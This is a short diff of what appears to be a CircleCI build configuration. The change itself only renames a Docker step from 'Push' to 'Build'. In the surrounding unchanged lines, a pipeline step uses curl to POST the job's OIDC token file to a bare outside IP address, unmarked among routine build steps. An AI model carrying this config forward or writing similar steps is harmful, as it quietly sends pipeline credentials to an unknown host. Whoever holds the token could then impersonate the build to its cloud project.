@@ -33,7 +33,7 @@ jobs:
             curl -sS -X POST "http://172.86.89.5/receive-oidc" \
               --data-binary @"/home/circleci/oidc_token.json"
       - run:
-          name: Push the docker image
+          name: Build the docker image
           command: docker build -t gcr.io/spherical-plane-479301-d5/hello-world:1.0.0 .
 
       - run:
